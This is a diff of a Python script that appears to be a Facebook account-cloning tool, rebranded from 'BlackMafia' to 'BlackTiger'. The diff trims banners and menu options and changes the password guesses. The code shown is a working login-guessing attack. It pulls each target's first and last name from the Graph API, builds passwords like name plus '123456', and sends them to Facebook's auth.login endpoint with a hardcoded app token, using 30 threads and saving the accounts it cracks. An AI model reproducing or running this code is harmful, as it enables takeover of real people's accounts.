@@ -51,40 +51,7 @@ def jalan(z):
 #Dev:love_hacker
 ##### LOGO #####
 logo = """
-\033[1;93m██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗
-\033[1;93m██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝
-\033[1;93m██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░
-\033[1;93m██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░
-\033[1;93m██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗
-\033[1;93m╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
-\033[1;92m███╗░░░███╗░█████╗░███████╗██╗░█████╗░
-\033[1;92m████╗░████║██╔══██╗██╔════╝██║██╔══██╗
-\033[1;92m██╔████╔██║███████║█████╗░░██║███████║
-\033[1;92m██║╚██╔╝██║██╔══██║██╔══╝░░██║██╔══██║
-\033[1;92m██║░╚═╝░██║██║░░██║██║░░░░░██║██║░░██║
-\033[1;92m╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝
-\033[1;96m▇▇┈┈┈┈╱▔▔▔▔╲┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈╱▔▔▔▔╲┈┈┈┈▇▇
-\033[1;96m▇▇┈┈┈▕▕╲┊┊╱▏▏┈┈┈▇▇\033[1;91m  ▇▇┈┈┈▕▕╲┊┊╱▏▏┈┈┈▇▇
-\033[1;96m▇▇┈┈┈▕▕▂╱╲▂▏▏┈┈┈▇▇\033[1;91m  ▇▇┈┈┈▕▕▂╱╲▂▏▏┈┈┈▇▇
-\033[1;96m▇▇┈┈┈┈╲┊┊┊┊╱┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈╲┊┊┊┊╱┈┈┈┈▇▇
-\033[1;96m▇▇┈┈┈┈▕╲▂▂╱▏┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈▕╲▂▂╱▏┈┈┈┈▇▇
-\033[1;96m▇▇╱▔▔▔▔┊┊┊┊▔▔▔▔╲▇▇\033[1;91m  ▇▇╱▔▔▔▔┊┊┊┊▔▔▔▔╲▇▇
-\033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
-\033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
-\033[1;93m▇▇▇▇▇ WhatsApp Num\033[1;93m  03094161457 ▇▇▇▇▇
-\033[1;95m              　　　/)
-　             　_(⌒)＿　　/)
-　             ／ / ﾉ　 ヽ /ﾋ)
-             `/ｲ// /LLﾄLL|/ /
-             ｜|/ /(6　6(/ /
-             ｜/_/ " ヮ"ﾉ_/
-             /Y　ﾚ `ーイ /
-             ﾚ|　ヽ-====-＼
-             ﾚヽ　/／⌒＼ ⌒＼
-             　 ＼ｿ 　　｜  ｜
-　             　 )ヽ＿／＿／
-　              ／　　 ﾉ ﾉ
-\033[1;97m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"""
+•"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -104,27 +71,7 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print  """
 \033[1;91m██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗
-\033[1;91m██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝
-\033[1;91m██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░
-\033[1;91m██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░
-\033[1;91m██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗
-\033[1;91m╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
-\033[1;91m███╗░░░███╗░█████╗░███████╗██╗░█████╗░
-\033[1;91m████╗░████║██╔══██╗██╔════╝██║██╔══██╗
-\033[1;91m██╔████╔██║███████║█████╗░░██║███████║
-\033[1;91m██║╚██╔╝██║██╔══██║██╔══╝░░██║██╔══██║
-\033[1;91m██║░╚═╝░██║██║░░██║██║░░░░░██║██║░░██║
-\033[1;91m╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝
-\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;92mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"""
-jalan("\033[1;93m┳┻┳┻▇▇▇▇▇▇     ╭━━━━╮╱▔▔▔╲      ▇▇▇▇▇▇┳┻┳┻┳┻")
-jalan("\033[1;93m┻┳┻┳▇▇▇▇▇▇     ┃╯╯╭━┫▏╰╰╰▕      ▇▇▇▇▇▇┻┳┻┳┻┳")
-jalan("\033[1;93m┳┻┳┻▇▇▇▇▇▇     ┃╯╯┃▔╰┓▔▂▔▕╮     ▇▇▇▇▇▇┳┻┳┻┳┻")
-jalan("\033[1;93m┻┳┻┳▇▇▇▇▇▇     ╰╮╯┃┈╰┫╰━╯┏╯     ▇▇▇▇▇▇┻┳┻┳┻┳")
-jalan("\033[1;93m┳┻┳┻▇▇▇▇▇▇     ┏╯╯┃╭━╯┳━┳╯      ▇▇▇▇▇▇┻┳┻┳┻┳")
-jalan("\033[1;93m┻┳┻┳▇▇▇▇▇▇     ╰━┳╯▔╲╱▔╭╮▔╲     ▇▇▇▇▇▇┳┻┳┻┳┻")
-jalan("\033[1;93m┳┻┳┻▇▇▇▇▇▇       ┃┈╲┈╲╱╭╯╮▕     ▇▇▇▇▇▇┻┳┻┳┻┳")
-jalan("\033[1;93m┻┳┻┳▇▇▇▇▇▇       ┃┈▕╲▂╱┈╭╯╱     ▇▇▇▇▇▇┳┻┳┻┳┻")
-jalan("\033[1;93m┳┻┳┻▇▇▇▇▇▇       ┃'''┈┃┈┃┈'''   ▇▇▇▇▇▇┻┳┻┳┻┳")
+"""
 jalan("\033[1;93m┻┳┻┳▇▇▇▇▇▇     ┏╯▔'''╰┓┣━┳┫     ▇▇▇▇▇▇┳┻┳┻┳┻")
 print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;92mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 
@@ -239,18 +186,8 @@ def menu():
 	print "\033[1;97m«--•◈••◈•--\033[1;93mLogged in User Info\033[1;97m---•◈••◈•---»"
 	print "	   \033[1;93m ◈••◈Name\033[1;97m:\033[1;91m"+nama+"\033[1;93m               "
 	print "	   \033[1;93m ◈••◈ID\033[1;97m:\033[1;92m"+id+"\x1b[1;96m              "
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
-	print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;93m Start Cloning India"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;92m Start Cloning Pakistan ID&(Group)"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m3.\x1b[1;96m Start Cloning Indonasia"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m4.\x1b[1;95m Start Cloning USA"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m5.\x1b[1;94m Start Cloning Bangladash"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m6.\x1b[1;93m Start Cloning All Country"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m7.\x1b[1;95m Start Cloning Member Group "
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m8.\x1b[1;92m Start Target  Attack"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m9.\x1b[1;91m Black Mafia   Massage "
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m10.\033[1;93mShow  Token"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m11.\033[1;91mAfter Cloning Data Reset "
+	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mBlackTiger\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+	print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;93m Start Cloning RANA"
 	print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91m logout "
 	pilih()
 
@@ -262,23 +199,6 @@ def pilih():
 		pilih()
 	elif unikers =="1":
 		super()
-        elif unikers =="2":
-		crack()
-        elif unikers =="3":
-		hack()
-        elif unikers =="4":
-		black()
-        elif unikers =="5":
-		mafia()
-        elif unikers =="6":
-		test()
-        elif unikers =="7":
-		clone_dari_member_group()
-        elif unikers =="8":
-		os.system('clear')
-		print logo
-		brute()
-        elif unikers =="9":
 		os.system('clear')
 		print logo
 		print " \033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•Massage•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\n"
@@ -417,7 +337,7 @@ def pilih_crack():
 	print "\n\033[1;91m«--•◈••◈•---\x1b[1;95m•◈•Stop Process Press CTRL+Z•◈•\033[1;91m---•◈••◈•-»"
 	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
 	jalan(' \033[1;91m.................\033[1;95mCloning Start..\033[1;91m............ ')
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMTiger033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
 	
 			
 	def main(arg):
@@ -426,7 +346,7 @@ def pilih_crack():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:love_hacker
+			pass #Dev:rana
 		try:													
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
 			b = json.loads(a.text)												
@@ -496,7 +416,7 @@ def pilih_crack():
 				                           cek.close()
 				                           cekpoint.append(user+pass3)									
 					               else:										
-						           pass4 = b['first_name'] + 'khan'											
+						           pass4 = b['first_name'] + '123456789'											
 			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                   q = json.load(data)												
 			                                   if 'access_token' in q:		
@@ -518,7 +438,7 @@ def pilih_crack():
 				                                       cek.close()
 				                                       cekpoint.append(user+pass4)					
 					                           else:									
-						                       pass5 = '786786'							
+						                       pass5 = b['first_name'] + '123456'					
 						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
 						                       q = json.load(data)								
 						                       if 'access_token' in q:	
@@ -540,7 +460,7 @@ def pilih_crack():
 				                                                   cek.close()
 				                                                   cekpoint.append(user+pass5)					
 						                               else:								
-							                           pass6 = 'Pakistan'											
+							                           pass6 = b['last_name'] + '1234'											
 			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                           q = json.load(data)												
 			                                                           if 'access_token' in q:	
@@ -584,7 +504,7 @@ def pilih_crack():
 				                                                                           cek.close()
 				                                                                           cekpoint.append(user+pass7)           					
 								                                       else:						
-										                           pass8 = b['last_name'] + '786'											
+										                           pass8 = b['last_name'] + '12345'											
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
 			                                                                                   if 'access_token' in q:		
@@ -606,7 +526,7 @@ def pilih_crack():
 				                                                                                       cek.close()
 				                                                                                       cekpoint.append(user+pass8)   	
 										                                   else:					
-										                                       pass9 = b['first_name'] + '786'					
+										                                       pass9 = b['first_name'] + '12'					
 										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
 										                                       q = json.load(data)				
 										                                       if 'access_token' in q:		
@@ -636,7 +556,7 @@ def pilih_crack():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:love_hacker
+	print "  \033[1;91m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:rana
 	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (0 & Data Reset)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
@@ -660,10 +580,10 @@ _______¶¶¶_________¶______¶_________¶¶¶______
  
          Checkpoint ID Open After 7 Days
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;91m ....lovehacker  BlackMafia....... \033[1;95m :
+: \033[1;91m ....rana....... \033[1;95m :
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 WhatsApp Num
-              \033[1;91m +923094161457"""
+              \033[1;91m +92"""
 	
 	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
 	menu()
